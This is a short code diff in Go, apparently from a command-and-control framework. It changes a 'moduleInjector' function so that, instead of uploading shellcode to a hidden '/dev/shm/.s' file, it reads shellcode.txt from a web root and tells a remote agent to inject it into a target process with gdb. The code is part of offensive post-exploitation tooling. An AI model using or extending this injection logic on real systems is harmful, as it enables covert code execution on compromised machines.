@@ -11,20 +11,14 @@ func moduleInjector() {
 	}
 
 	// upload shellcode.txt
-	shellcode_file := Options["shellcode_file"].Val
 	pid := Options["pid"].Val
-	if !agent.IsFileExist(shellcode_file) {
-		CliPrintError("%s does not exist", shellcode_file)
-		return
-	}
-	err := PutFile(shellcode_file, "/dev/shm/.s", target)
-	if err != nil {
-		CliPrintError("Could not upload shellcode file (%s): %v", shellcode_file, err)
+	if !agent.IsFileExist(WWWRoot + "shellcode.txt") {
+		CliPrintError("%sshellcode.txt does not exist", WWWRoot)
 		return
 	}
 
 	// tell agent to inject this shellcode
-	err = SendCmd("!inject gdb /dev/shm/.s "+pid, target)
+	err = SendCmd("!inject gdb "+pid, target)
 	if err != nil {
 		CliPrintError("Could not send command to agent: %v", err)
 		return
